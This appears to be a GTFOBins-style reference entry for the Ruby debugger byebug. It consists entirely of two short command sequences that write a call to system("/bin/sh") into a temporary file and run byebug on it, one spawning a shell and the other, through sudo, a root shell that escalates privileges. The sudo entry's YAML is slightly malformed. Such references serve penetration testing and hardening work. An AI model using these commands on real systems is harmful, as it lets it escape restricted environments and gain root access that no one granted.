---
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo 'system("/bin/sh")' > $TF
        byebug $TF
        continue
  sudo:
        TF=$(mktemp)
        echo 'system("/bin/sh")' > $TF
        sudo byebug $TF
        continue
---
